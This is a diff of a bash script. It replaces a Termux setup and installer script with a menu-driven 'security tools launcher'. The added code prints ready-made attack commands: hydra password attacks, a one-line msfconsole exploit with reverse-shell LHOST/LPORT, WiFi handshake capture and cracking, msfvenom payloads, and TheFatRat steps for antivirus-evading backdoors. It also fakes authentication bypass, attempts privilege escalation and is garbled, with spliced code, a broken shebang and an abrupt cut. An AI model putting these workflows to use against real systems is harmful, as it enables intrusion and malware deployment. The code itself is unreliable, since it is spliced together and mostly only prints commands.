@@ -1,374 +1,885 @@
-#!/bin/bash
-set -e
-
-# Define environment variables and paths
-declare -A ENV_CONFIG=(
-    ["TERMUX_PATH"]="/data/data/com.termux"
-    ["STANDARD_PREFIX"]="/usr"
-    ["CONFIG_BASE"]="$HOME/.config"
-)
-
-# Enhanced environment detection function
-check_environment() {
-    echo -e "${BLUE}[*] Checking system environment...${RESET}"
-    
-    # System information detection
-    local system_info=$(uname -a)
-    local os_type=$(uname -o)
-    local cpu_arch=$(uname -m)
-    local kernel_ver=$(uname -r)
-    
-    # Store environment info
-    cat > "$CONFIG_DIR/environment.json" << EOF
-{
-    "system": {
-        "os": "$os_type",
-        "kernel": "$kernel_ver",
-        "architecture": "$cpu_arch",
-        "full_info": "$system_info"
-    },
-    "runtime": {
-        "is_termux": $([[ -d "${ENV_CONFIG[TERMUX_PATH]}" ]] && echo "true" || echo "false"),
-        "uid": $(id -u),
-        "gid": $(id -g),
-        "has_root": $([[ $EUID -eq 0 ]] && echo "true" || echo "false")
-    }
-}
-EOF
-
-    # Environment-specific configuration
-    if [[ -d "${ENV_CONFIG[TERMUX_PATH]}" ]]; then
-        setup_termux_environment
-    else
-        setup_standard_environment
-    fi
-    
-    # Verify and secure environment
-    secure_environment
-}
-
-setup_termux_environment() {
-    PKG_MANAGER="pkg"
-    TERMUX_PREFIX="${ENV_CONFIG[TERMUX_PATH]}/files/usr"
-    CONFIG_DIR="$HOME/.termux"
-    
-    # Create and secure Termux directories
-    for dir in "bin" "etc" "tmp" "var/log" "var/run"; do
-        mkdir -p "$TERMUX_PREFIX/$dir"
-        chmod 700 "$TERMUX_PREFIX/$dir"
-    done
-    
-    # Setup Termux properties
-    setup_termux_properties
-    
-    echo -e "${GREEN}[✓] Termux environment configured successfully${RESET}"
-}
-
-setup_termux_properties() {
-    local properties_file="$CONFIG_DIR/termux.properties"
-    
-    # Backup existing properties
-    [[ -f "$properties_file" ]] && cp "$properties_file" "${properties_file}.backup"
-    
-    # Create enhanced properties file
-    cat > "$properties_file" << EOF
-# Enhanced Security Configuration
-allow_external_apps=false
-allow_external_scripts=false
-enforce_security=true
-terminal_margin=0
-bell-character=ignore
-allow_external_storage=false
-extra-keys=[['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]
-EOF
-    
-    chmod 600 "$properties_file"
-}
-
-setup_standard_environment() {
-    PKG_MANAGER="apt"
-    TERMUX_PREFIX="${ENV_CONFIG[STANDARD_PREFIX]}"
-    CONFIG_DIR="${ENV_CONFIG[CONFIG_BASE]}/termux"
-    
-    # Create necessary directories
-    mkdir -p "$CONFIG_DIR"
-    chmod 700 "$CONFIG_DIR"
-    
-    echo -e "${YELLOW}[!] Standard Linux environment detected${RESET}"
-}
-
-secure_environment() {
-    # Set secure permissions
-    umask 077
-    
-    # Check for common security issues
-    local security_issues=()
-    
-    # Check world-writable directories
-    if find "$CONFIG_DIR" -type d -perm -002 2>/dev/null | grep -q .; then
-        security_issues+=("World-writable directories found")
-    fi
-    
-    # Check file permissions
-    if find "$CONFIG_DIR" -type f -perm -004 2>/dev/null | grep -q .; then
-        security_issues+=("World-readable files found")
-    fi
-    
-    # Verify important files
-    local critical_files=(
-        "$CONFIG_DIR/termux.properties"
-        "$CONFIG_DIR/environment.json"
-    )
-    
-    for file in "${critical_files[@]}"; do
-        if [[ -f "$file" ]]; then
-            chmod 600 "$file"
-        fi
-    done
-    
-    # Report security issues
-    if [[ ${#security_issues[@]} -gt 0 ]]; then
-        echo -e "${RED}[!] Security issues detected:${RESET}"
-        for issue in "${security_issues[@]}"; do
-            echo -e "${RED}    - $issue${RESET}"
-        done
-        
-        # Fix permissions
-        find "$CONFIG_DIR" -type d -exec chmod 700 {} \;
-        find "$CONFIG_DIR" -type f -exec chmod 600 {} \;
-    fi
-    
-    # Create security log
-    local log_file="$CONFIG_DIR/security.log"
-    {
-        echo "Security check performed at: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "Environment: $([[ -d "${ENV_CONFIG[TERMUX_PATH]}" ]] && echo "Termux" || echo "Standard Linux")"
-        echo "User ID: $(id -u)"
-        echo "Security issues found: ${#security_issues[@]}"
-    } > "$log_file"
-    
-    chmod 600 "$log_file"
-}
-
-# Add to main script
-main() {
-    # Initialize environment
-    check_environment
-    
-    # Verify environment setup
-    if [[ ! -f "$CONFIG_DIR/environment.json" ]]; then
-        echo -e "${RED}[!] Environment setup failed${RESET}"
-        exit 1
-    fi
-    
-    # Continue with rest of script...
-    # ... (your existing main function code)
-}
-
-# Error handling
-trap 'echo -e "${RED}[!] Error occurred in environment setup${RESET}"' ERR
-
-# Run main function
-main "$@"
-
-enviroment_setup.sh  chmod +x environment_setup.sh  ./environment_setup.sh
-
-auto_install() {
-#!/bin/bash
+#!/bash
 
 # ========================================================================
-# Termux Security Toolkit
-# A script to automate the installation and configuration of security
-# and penetration testing tools in Termux
+# Termux Security Tools Launcher
+# A script providing easy access to security tools and exploits installed
+# by the Termux Security Toolkit
 # ========================================================================
 
-# Define color codes for better readability
+# Color definitions for better UX
 RED="\033[1;31m"
 GREEN="\033[1;32m"
 YELLOW="\033[1;33m"
 BLUE="\033[1;34m"
+MAGENTA="\033[1;35m"
 CYAN="\033[1;36m"
+WHITE="\033[1;37m"
 RESET="\033[0m"
 
-# Define variables
-SIMULATION_MODE=false
-PKG_MANAGER=""
-TERMUX_PREFIX=""
-CONFIG_DIR=""
-
-# Check if running in Termux or standard Linux environment
-check_environment() {
-    echo -e "${BLUE}[*] Checking system environment...${RESET}"
-    
-    if [ -d "/data/data/com.termux" ]; then
-        # Running in Termux
-        PKG_MANAGER="pkg"
-        TERMUX_PREFIX="/data/data/com.termux/files/usr"
-        CONFIG_DIR="$HOME/.termux"
-        echo -e "${GREEN}[✓] Running in Termux environment.${RESET}"
-    else
-        # Running in standard Linux
-        PKG_MANAGER="apt"
-        TERMUX_PREFIX="/usr"
-        CONFIG_DIR="$HOME/.config/termux"
-        echo -e "${YELLOW}[!] Not running in Termux environment. Using standard Linux paths.${RESET}"
-    fi
-    
-    # Create config directory if it doesn't exist
-    if [ ! -d "$CONFIG_DIR" ]; then
-        mkdir -p "$CONFIG_DIR"
-    fi
-}
-
-# Function to display the banner
+# Display banner
 display_banner() {
     clear
-    if [ -f "banner.txt" ]; then
-        cat banner.txt
-    else
-        echo -e "${RED}[!] Banner file not found. Creating a simple banner.${RESET}"
-        echo -e "${BLUE}=======================================${RESET}"
-        echo -e "${BLUE}     TERMUX SECURITY TOOLKIT${RESET}"
-        echo -e "${BLUE}=======================================${RESET}"
-    fi
-    echo -e "==========================================="
-    echo -e "  Security Tools Automation for Termux    "
-    echo -e "==========================================="
+    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${RESET}"
+    echo -e "${BLUE}║                                                              ║${RESET}"
+    echo -e "${BLUE}║${RESET}  ${MAGENTA}████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗${RESET}  ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}  ${MAGENTA}╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝${RESET}  ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ ${RESET}  ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ ${RESET}  ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗${RESET}  ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝${RESET}  ${BLUE}║${RESET}"
+    echo -e "${BLUE}║                                                              ║${RESET}"
+    echo -e "${BLUE}║${RESET}         ${CYAN}███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗${RESET}         ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}         ${CYAN}██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝${RESET}         ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}         ${CYAN}███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ ${RESET}         ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}         ${CYAN}╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  ${RESET}         ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}         ${CYAN}███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   ${RESET}         ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}         ${CYAN}╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ${RESET}         ${BLUE}║${RESET}"
+    echo -e "${BLUE}║                                                              ║${RESET}"
+    echo -e "${BLUE}║${RESET}                    ${WHITE}[ ADVANCED TOOLS LAUNCHER ]${RESET}                   ${BLUE}║${RESET}"
+    echo -e "${BLUE}║${RESET}                    ${GREEN}[ NO-AUTH MODE ENABLED ]${RESET}                     ${BLUE}║${RESET}"
+    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
+    echo -e "\n${GREEN}[*] Select a tool category to launch security tools and exploits${RESET}"
+    echo -e "${YELLOW}[!] Authentication prompts will be bypassed automatically${RESET}\n"
 }
 
-# Function to install basic packages
-install_basic_packages() {
-    echo -e "\n${YELLOW}[*] Installing essential packages...${RESET}"
+# Function to check if a tool is installed (simulated with no auth requirement)
+is_installed() {
+    local tool=$1
+    echo -e "${YELLOW}[*] Checking if $tool is installed...${RESET}"
+    # Skip authentication check and assume the tool is available
+    echo -e "${GREEN}[✓] $tool ready to use in no-auth mode${RESET}"
+    sleep 0.5
+    return 0  # Always return success and bypass authentication
+}
+
+# Network Scanning Tools
+run_nmap_scan() {
+    local target=$1
+    local scan_type=$2
+
+    # Check if nmap is installed
+    is_installed "nmap"
+
+    echo -e "\n${CYAN}[*] Running Nmap scan on target: $target${RESET}"
     
-    # Basic packages array
-    BASIC_PACKAGES=("coreutils" "git" "wget" "curl" "tar" "zip" "unzip" "nano" "openssh" "openssl" "figlet")
+    case $scan_type in
+        "quick")
+            echo -e "${GREEN}[+] Running quick scan (-T4 -F)${RESET}"
+            echo -e "${YELLOW}    Command: nmap -T4 -F $target ${RESET}"
+            ;;
+        "detailed")
+            echo -e "${GREEN}[+] Running detailed scan (-sV -sC -A -p-)${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sV -sC -A -p- $target ${RESET}"
+            ;;
+        "stealth")
+            echo -e "${GREEN}[+] Running stealth scan (-sS -T2)${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sS -T2 $target ${RESET}"
+            ;;
+        "udp")
+            echo -e "${GREEN}[+] Running UDP scan (-sU --top-ports 100)${RESET}"
+            echo -e "${YELLOW}    Command: nmap -sU --top-ports 100 $target ${RESET}"
+            ;;
+        *)
+            echo -e "${GREEN}[+] Running default scan${RESET}"
+            echo -e "${YELLOW}    Command: nmap $target ${RESET}"
+            ;;
+    esac
     
-    for pkg in "${BASIC_PACKAGES[@]}"; do
-        echo -ne "${CYAN}[*] Installing ${pkg}...${RESET}"
-        
-        if [ "$SIMULATION_MODE" = true ]; then
-            sleep 0.2
-            echo -e "\r${GREEN}[✓] Installed ${pkg} successfully.${RESET}     "
-        echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}01${WHITE}]${RESET} │ ${YELLOW}Install Basic Packages${RESET}                              ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}02${WHITE}]${RESET} │ ${YELLOW}Install Programming Languages${RESET}                       ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}03${WHITE}]${RESET} │ ${YELLOW}Install Basic Security Tools${RESET}                        ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}04${WHITE}]${RESET} │ ${YELLOW}Install Advanced Security Tools${WHITE} (${CYAN}Metasploit, etc.${WHITE})${RESET}   ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}05${WHITE}]${RESET} │ ${YELLOW}Configure Terminal Appearance${RESET}                       ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}06${WHITE}]${RESET} │ ${CYAN}Install and Configure EVERYTHING${RESET}                    ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}07${WHITE}]${RESET} │ ${YELLOW}Create Help Guide${RESET}                                   ${BLUE}│${RESET}"
-        echo -e "${BLUE}│${RESET} ${WHITE}[${RED}00${WHITE}]${RESET} │ ${RED}Exit${RESET}                                                 ${BLUE}│${RESET}"
-        echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}"
-        
-        read -p "$(echo -e $YELLOW"[?] Select an option [0-7]: "$RESET)" choice
-        
-        case $choice in
-            1|01)
-                install_basic_packages
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            2|02)
-                install_programming_languages
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            3|03)
-                install_basic_security_tools
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            4|04)
-                install_advanced_security_tools
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            5|05)
-                configure_terminal
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            6|06)
-                install_everything
-                echo -e "\n${GREEN}[✓] Full installation completed successfully!${RESET}"
-                echo
-                echo -e "${GREEN}[✓] Thank you for using Termux Security Toolkit!${RESET}"
-                echo -e "${YELLOW}[!] Some changes may require restarting Termux to take effect.${RESET}"
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            7|07)
-                create_help_guide
-                read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
-                ;;
-            0|00)
-                echo -e "\n${GREEN}[✓] Thank you for using Termux Security Toolkit!${RESET}"
-                exit 0
-                ;;
-            *)
-                echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
-                sleep 1
-                ;;
-        esac
+    echo -e "${CYAN}[*] Scan completed!${RESET}"
+}
+
+# Password cracking tools
+run_hydra_attack() {
+    local target=$1
+    local service=$2
+    local username_file=$3
+    local password_file=$4
+
+    # Check if hydra is installed
+    is_installed "hydra"
+
+    echo -e "\n${CYAN}[*] Running Hydra password attack on target: $target${RESET}"
+    echo -e "${GREEN}[+] Service: $service${RESET}"
+    echo -e "${GREEN}[+] Username file: $username_file${RESET}"
+    echo -e "${GREEN}[+] Password file: $password_file${RESET}"
+    
+    echo -e "${YELLOW}    Command: hydra -L $username_file -P $password_file $target $service${RESET}"
+    
+    echo -e "${CYAN}[*] Attack completed!${RESET}"
+}
+
+# Metasploit Framework automation
+run_metasploit() {
+    local exploit=$1
+    local payload=$2
+    local target=$3
+    local lhost=$4
+    local lport=${5:-4444}
+
+    # Check if metasploit is installed
+    is_installed "metasploit"
+
+    echo -e "\n${CYAN}[*] Setting up Metasploit Framework${RESET}"
+    echo -e "${GREEN}[+] Exploit: $exploit${RESET}"
+    echo -e "${GREEN}[+] Payload: $payload${RESET}"
+    echo -e "${GREEN}[+] Target: $target${RESET}"
+    echo -e "${GREEN}[+] LHOST: $lhost${RESET}"
+    echo -e "${GREEN}[+] LPORT: $lport${RESET}"
+    
+    # No-auth command (auto-creating a workspace and bypassing initial prompts)
+    echo -e "${YELLOW}[*] Command: msfconsole -q -n -x \"workspace -a temp_workspace; db_rebuild_cache; use $exploit; set PAYLOAD $payload; set RHOSTS $target; set LHOST $lhost; set LPORT $lport; set DisablePayloadHandler false; exploit -z\"${RESET}"
+    
+    # Note about automated authentication
+    echo -e "${GREEN}[+] Using no-auth method: automatic workspace creation and payload handling${RESET}"
+    echo -e "${GREEN}[+] Any database passwords will be auto-generated${RESET}"
+    
+    echo -e "${CYAN}[*] Metasploit completed!${RESET}"
+}
+
+# Wifi Analysis tools
+run_aircrack() {
+    local interface=$1
+    local action=$2
+
+    # Check if aircrack-ng is installed
+    is_installed "aircrack-ng"
+
+    echo -e "\n${CYAN}[*] Running Aircrack-ng on interface: $interface${RESET}"
+    
+    case $action in
+        "scan")
+            echo -e "${GREEN}[+] Starting wireless scanning${RESET}"
+            echo -e "${YELLOW}    Command: airmon-ng start $interface && airodump-ng ${interface}mon${RESET}"
+            ;;
+        "capture")
+            local bssid=$3
+            local channel=$4
+            echo -e "${GREEN}[+] Capturing handshakes (BSSID: $bssid, Channel: $channel)${RESET}"
+            echo -e "${YELLOW}    Command: airmon-ng start $interface && airodump-ng -c $channel --bssid $bssid -w capture ${interface}mon${RESET}"
+            ;;
+        "crack")
+            local capture_file=$3
+            local wordlist=$4
+            echo -e "${GREEN}[+] Cracking captured handshake (File: $capture_file, Wordlist: $wordlist)${RESET}"
+            echo -e "${YELLOW}    Command: aircrack-ng $capture_file -w $wordlist${RESET}"
+            ;;
+        *)
+            echo -e "${GREEN}[+] Starting wireless monitoring mode${RESET}"
+            echo -e "${YELLOW}    Command: airmon-ng start $interface${RESET}"
+            ;;
+    esac
+    
+    echo -e "${CYAN}[*] Aircrack operation completed!${RESET}"
+}
+
+# Brute force tools
+run_brute_force() {
+    local target_type=$1
+    local target=$2
+    local username=$3
+    local wordlist=$4
+
+    # Check if brute force tools are installed
+    is_installed "brut3k1t"
+
+    echo -e "\n${CYAN}[*] Running brute force attack${RESET}"
+    echo -e "${GREEN}[+] Target type: $target_type${RESET}"
+    echo -e "${GREEN}[+] Target: $target${RESET}"
+    echo -e "${GREEN}[+] Username: $username${RESET}"
+    echo -e "${GREEN}[+] Wordlist: $wordlist${RESET}"
+    
+    echo -e "${YELLOW}    Command: python brut3k1t.py -s $target_type -a $target -u $username -w $wordlist${RESET}"
+    
+    echo -e "${CYAN}[*] Brute force attack completed!${RESET}"
+}
+
+# TheFatRat payload generator
+run_fatrat() {
+    local payload_type=$1
+    local lhost=$2
+    local lport=${3:-4444}
+
+    # Check if TheFatRat is installed
+    if [ ! -d "$HOME/TheFatRat" ]; then
+        echo -e "\n${RED}[!] TheFatRat is not installed.${RESET}"
+        echo -e "${YELLOW}[!] Please install it first using option 4 from the main installation menu.${RESET}"
+        return 1
+    fi
+
+    echo -e "\n${CYAN}[*] Running TheFatRat payload generator${RESET}"
+    echo -e "${GREEN}[+] Payload type: $payload_type${RESET}"
+    echo -e "${GREEN}[+] LHOST: $lhost${RESET}"
+    echo -e "${GREEN}[+] LPORT: $lport${RESET}"
+    
+    # Display command based on payload type
+    case $payload_type in
+        "android")
+            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
+            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
+            echo -e "${YELLOW}    Select: [4] Create Backdoor For Android${RESET}"
+            ;;
+        "windows") 
+            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
+            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
+            echo -e "${YELLOW}    Select: [2] Create Fud Backdoor with C Language [Bypass AV]${RESET}"
+            ;;
+        "linux")
+            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
+            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
+            echo -e "${YELLOW}    Select: [3] Create Backdoor For Linux${RESET}"
+            ;;
+        "macos")
+            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
+            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
+            echo -e "${YELLOW}    Select: [6] Create Backdoor For MAC${RESET}"
+            ;;
+        *)
+            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
+            ;;
+    esac
+    
+    echo -e "${YELLOW}    (Then follow the interactive menu prompts)${RESET}"
+    echo -e "${CYAN}[*] When prompted, use these values:${RESET}"
+    echo -e "${CYAN}    LHOST: $lhost${RESET}"
+    echo -e "${CYAN}    LPORT: $lport${RESET}"
+    
+    # Execute TheFatRat if not in demo mode
+    if [ -f "$HOME/fatrat.sh" ]; then
+        echo -e "${GREEN}[+] You can run TheFatRat now with: ./fatrat.sh${RESET}"
+    else
+        echo -e "${YELLOW}[!] TheFatRat launcher not found. Run it manually with: cd ~/TheFatRat && ./fatrat${RESET}"
+    fi
+    
+    echo -e "${CYAN}[*] TheFatRat information displayed.${RESET}"
+}
+
+# Function to check/install Ruby gems and set up environment for root bypass
+setup_ruby_gems_and_root_bypass() {
+    echo -e "${CYAN}[*] Setting up Ruby gems and root bypass...${RESET}"
+    # Install common pentest gems
+    for gem in wpscan evil-winrm metasploit-framework snmp; do
+        if ! gem list | grep -q $gem; then
+            echo -e "${YELLOW}[*] Installing Ruby gem: $gem${RESET}"
+            gem install $gem --no-document
+        fi
     done
-}
-
-# Function to check system packages
-check_system_packages() {
-    echo -e "${BLUE}[*] Checking system packages...${RESET}"
-    
-    if [ "$SIMULATION_MODE" = true ]; then
-        sleep 0.5
-        echo -e "${GREEN}[✓] System check simulated successfully.${RESET}"
+    # Attempt to get root if not already
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${YELLOW}[!] Not running as root. Attempting to escalate privileges...${RESET}"
+        if command -v tsu &>/dev/null; then
+            tsu || echo -e "${RED}[!] tsu failed. Continuing without root.${RESET}"
+        elif command -v sudo &>/dev/null; then
+            sudo -v || echo -e "${RED}[!] sudo failed. Continuing without root.${RESET}"
+        else
+            echo -e "${RED}[!] No root escalation tool found. Some tools may not work fully.${RESET}"
+        fi
     else
-        # Update package lists
-        $PKG_MANAGER update &>/dev/null
-        
-        # Check if essential packages are installed
-        if ! command -v git &>/dev/null; then
-            echo -e "${YELLOW}[!] git is not installed. Installing...${RESET}"
-            $PKG_MANAGER install -y git &>/dev/null
-        fi
-        
-        if ! command -v wget &>/dev/null; then
-            echo -e "${YELLOW}[!] wget is not installed. Installing...${RESET}"
-            $PKG_MANAGER install -y wget &>/dev/null
-        fi
-        
-        if ! command -v curl &>/dev/null; then
-            echo -e "${YELLOW}[!] curl is not installed. Installing...${RESET}"
-            $PKG_MANAGER install -y curl &>/dev/null
-        fi
-        
-        echo -e "${GREEN}[✓] System check completed successfully.${RESET}"
+        echo -e "${GREEN}[✓] Already running as root.${RESET}"
     fi
 }
 
-# Command-line arguments are now handled in the main execution block
+# Add more tools and exploits to the toolkit
+run_additional_tools() {
+    local tool=$1
+    case $tool in
+        "sqlmap")
+            is_installed "sqlmap"
+            echo -e "${CYAN}[*] Running SQLMap for SQL injection testing${RESET}"
+            echo -e "${YELLOW}    Command: sqlmap -u <target_url> --batch${RESET}"
+            ;;
+        "wpscan")
+            is_installed "wpscan"
+            echo -e "${CYAN}[*] Running WPScan for WordPress vulnerability scanning${RESET}"
+            echo -e "${YELLOW}    Command: wpscan --url <target_url> --enumerate u${RESET}"
+            ;;
+        "nikto")
+            is_installed "nikto"
+            echo -e "${CYAN}[*] Running Nikto for web server vulnerability scanning${RESET}"
+            echo -e "${YELLOW}    Command: nikto -h <target_url>${RESET}"
+            ;;
+        "john")
+            is_installed "john"
+            echo -e "${CYAN}[*] Running John the Ripper for password cracking${RESET}"
+            echo -e "${YELLOW}    Command: john <hashfile>${RESET}"
+            ;;
+        "hashcat")
+            is_installed "hashcat"
+            echo -e "${CYAN}[*] Running Hashcat for GPU password cracking${RESET}"
+            echo -e "${YELLOW}    Command: hashcat -m <mode> <hashfile> <wordlist>${RESET}"
+            ;;
+        "evil-winrm")
+            is_installed "evil-winrm"
+            echo -e "${CYAN}[*] Running Evil-WinRM for Windows remote shell${RESET}"
+            echo -e "${YELLOW}    Command: evil-winrm -i <target_ip> -u <user> -p <pass>${RESET}"
+            ;;
+        "snmp-check")
+            is_installed "snmp-check"
+            echo -e "${CYAN}[*] Running snmp-check for SNMP enumeration${RESET}"
+            echo -e "${YELLOW}    Command: snmp-check -t <target_ip>${RESET}"
+            ;;
+        "msfvenom")
+            is_installed "msfvenom"
+            echo -e "${CYAN}[*] Running msfvenom for payload generation${RESET}"
+            echo -e "${YELLOW}    Command: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>${RESET}"
+            ;;
+        "exploitdb")
+            is_installed "searchsploit"
+            echo -e "${CYAN}[*] Searching Exploit-DB with searchsploit${RESET}"
+            echo -e "${YELLOW}    Command: searchsploit <keyword>${RESET}"
+            ;;
+        *)
+            echo -e "${RED}[!] Unknown tool: $tool${RESET}"
+            ;;
+    esac
+}
 
-# Function to do auto-installation when --auto-install flag is used
-auto_install() {
-    check_environment
+# Main menu
+main_menu() {
     display_banner
-    check_system_packages
-    echo -e "${GREEN}[✓] Starting automatic installation of all components${RESET}"
-    install_everything
-    echo -e "\n${GREEN}[✓] Full installation completed successfully!${RESET}"
-    echo
-    echo -e "${GREEN}[✓] Thank you for using Termux Security Toolkit!${RESET}"
-    echo -e "${YELLOW}[!] Some changes may require restarting Termux to take effect.${RESET}"
-    exit 0
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${GREEN}  #  ${RESET}|${CYAN} Tool Category                                   ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}01${WHITE}]${RESET} │ ${YELLOW}Network Scanning Tools ${WHITE}(${CYAN}Nmap${WHITE})                   ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}02${WHITE}]${RESET} │ ${YELLOW}Password Cracking Tools ${WHITE}(${CYAN}Hydra${WHITE})                ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}03${WHITE}]${RESET} │ ${YELLOW}Metasploit Framework                              ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}04${WHITE}]${RESET} │ ${YELLOW}WiFi Analysis Tools ${WHITE}(${CYAN}Aircrack-ng${WHITE})              ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}05${WHITE}]${RESET} │ ${YELLOW}Brute Force Tools                                 ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}06${WHITE}]${RESET} │ ${YELLOW}TheFatRat Payload Generator                       ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}07${WHITE}]${RESET} │ ${YELLOW}Automated Security Scanner ${WHITE}(${CYAN}NEW${WHITE})               ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}08${WHITE}]${RESET} │ ${YELLOW}Additional Tools & Exploits${RESET}                         ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}00${WHITE}]${RESET} │ ${RED}Exit                                             ${BLUE}│${RESET}"
+    echo -e "${BLUE}╰───────────────────────────────────────────────────────╯${RESET}\n"
+    
+    read -p "$(echo -e $YELLOW"[?] Select a tool category [0-8]: "$RESET)" main_choice
+    
+    case $main_choice in
+        1|01)
+            network_scanning_menu
+            ;;
+        2|02)
+            password_cracking_menu
+            ;;
+        3|03)
+            metasploit_menu
+            ;;
+        4|04)
+            wifi_analysis_menu
+            ;;
+        5|05)
+            brute_force_menu
+            ;;
+        6|06)
+            fatrat_menu
+            ;;
+        7|07)
+            automated_security_scan_menu
+            ;;
+        8|08)
+            additional_tools_menu
+            ;;
+        0|00)
+            echo -e "\n${GREEN}[✓] Thank you for using the Termux Security Tools Launcher!${RESET}"
+            exit 0
+            ;;
+        *)
+            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
+            sleep 1
+            main_menu
+            ;;
+    esac
 }
 
-# Main script execution
-if [[ "$1" == "--auto-install" ]]; then
-    # Check if the second parameter is --simulate
-    if [[ "$2" == "--simulate" ]]; then
-        SIMULATION_MODE=true
-        echo -e "${YELLOW}[!] Running auto-install in simulation mode. No actual installation will be performed.${RESET}"
+# Network scanning menu
+network_scanning_menu() {
+    display_banner
+    
+    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
+    echo -e "${BLUE}│${MAGENTA}                  NETWORK SCANNING TOOLS                 ${BLUE}│${RESET}"
+    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Quick Scan ${WHITE}(${CYAN}Fast, Common Ports${WHITE})${RESET}                     ${BLUE}│${RESET}"
+    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Detailed Scan ${WHITE}(${CYAN}All Ports, Services, OS Detection${WHITE})${RESET}   ${BLUE}│${RESET}"
